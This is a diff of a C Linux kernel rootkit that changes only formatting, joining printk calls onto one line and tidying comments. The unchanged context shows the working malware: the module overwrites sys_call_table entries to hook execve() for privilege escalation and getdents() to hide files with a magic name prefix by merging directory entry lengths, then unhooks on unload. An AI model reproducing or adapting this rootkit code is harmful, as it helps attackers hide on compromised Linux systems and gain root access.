@@ -188,8 +188,7 @@ t_syscall_hook *new_hook(const unsigned int offset, void *newFunc) {
  * Module initialization callback
  */
 int init_module(void) {
-    printk(KERN_INFO
-    "Rootkit module initalizing.\n");
+    printk(KERN_INFO "Rootkit module initalizing.\n");
 
     //Allocate & init a list to store our syscall_hooks
     hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
@@ -198,8 +197,7 @@ int init_module(void) {
     //We need to hardcode the sys_call_table's location in memory. Remember array
     //indices in C are offsets from the base (i.e. 0th idex) address of the array.
     sys_call_table = (void *) table_addr;
-    printk(KERN_INFO
-    "Syscall table loaded from %p\n", (void *) table_addr);
+    printk(KERN_INFO "Syscall table loaded from %p\n", (void *) table_addr);
 
     //Let's hook execve() for privilege escalation
     hook_syscall(new_hook(__NR_execve, (void *) &new_execve));
@@ -207,8 +205,7 @@ int init_module(void) {
     //Let's hook getdents() to hide our files
     hook_syscall(new_hook(__NR_getdents, (void *) &new_getdents));
 
-    printk(KERN_INFO
-    "Rootkit module is loaded!\n");
+    printk(KERN_INFO "Rootkit module is loaded!\n");
     return 0; //For successful load
 }
 
@@ -221,8 +218,7 @@ void cleanup_module(void) {
     t_syscall_hook_list *hook_entry;
     t_syscall_hook *hook;
 
-    printk(KERN_INFO
-    "Rootkit module unloaded\n");
+    printk(KERN_INFO "Rootkit module unloaded\n");
 
     //Iterate through the linked list of hook_entry's unhooking and deallocating
     //each as we go. We use the safe list_for_each because we are removing
@@ -232,8 +228,7 @@ void cleanup_module(void) {
         hook_entry = list_entry(element, t_syscall_hook_list, list);
         hook = hook_entry->hook;
 
-        printk(KERN_INFO
-        "Freeing my hook - offset %d\n", hook->offset);
+        printk(KERN_INFO "Freeing my hook - offset %d\n", hook->offset);
 
         if (hook->hooked)
             unhook_syscall(hook_entry->hook);
@@ -242,8 +237,7 @@ void cleanup_module(void) {
         kfree(hook_entry);
     }
 
-    printk(KERN_INFO
-    "Rootkit module cleanup complete\n");
+    printk(KERN_INFO "Rootkit module cleanup complete\n");
 }
 
 /*
@@ -295,7 +289,7 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
     //Execute original function to populate buffer_size and dirp
     buffer_size = (*orig_func)(fd, dirp, count);
 
-    // Copy dirp because we cannot edit userland memory from the kernel
+    //Copy dirp because we cannot edit userland memory from the kernel
     dirp_copy = (void *) kmalloc(buffer_size, GFP_USER);
     copy_from_user(dirp_copy, dirp, buffer_size);
 
@@ -306,13 +300,13 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
 
         if (strstr(((char*) d_next->d_name), magic_prefix)){
             //If d_next has magic prefix increment d's reclen by d_next's reclen to skip d_next in
-            // future dirent traversals, such as those done by 'ls'
+            //future dirent traversals, such as those done by 'ls'
             d->d_reclen += d_next->d_reclen;
         }
         buffer_pos += d->d_reclen;
     }
 
-    // Copy edited dirp back to userland and free kernel memory
+    //Copy edited dirp back to userland and free kernel memory
     copy_to_user(dirp, dirp_copy, buffer_size);
     kfree(dirp_copy);
 
